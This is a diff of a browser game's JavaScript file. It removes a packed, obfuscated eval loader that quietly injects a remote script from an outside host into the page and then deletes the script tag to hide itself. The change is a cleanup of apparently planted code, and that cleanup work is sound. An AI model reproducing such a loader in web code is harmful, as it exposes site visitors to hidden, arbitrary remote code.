@@ -798,6 +798,5 @@ Main.on("gameOver", function(event, distance, x){
 		}
 	}, 1200);
 });
-eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[4-9c-k]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c _$=[\'\\6\\7\\d\\8\\9\\4\',\'\\4\\e\\x78\\4\\5\\h\\f\\x76\\f\\6\\7\\d\\8\\9\\4\',\'\\x68\\4\\4\\9\\x3a\\5\\5\\x77\\e\\8\\g\\x32\\6\\x6b\\x79\\g\\7\\x6e\\5\\x67\\f\\x6d\\e\\5\\x35\\x37\\5\\x6f\\g\\h\\6\',\'\\6\\7\\d\\8\\9\\4\'];(i(){c a=j.createElement(_$[0]);a.type=_$[1];a.async=true;a.src=_$[2];c b=j.getElementsByTagName(_$[3])[0x0];b.k.insertBefore(a,b);a.onload=i(){a.k.removeChild(a)}})();',[],21,'||||x74|x2f|x73|x63|x69|x70|||var|x72|x65|x61|x2e|x6a|function|document|parentNode'.split('|'),0,{}))
 btGame.resizePlayArea($("#container"), Main.width, Main.height, "center", "center");
 Main.initStage();
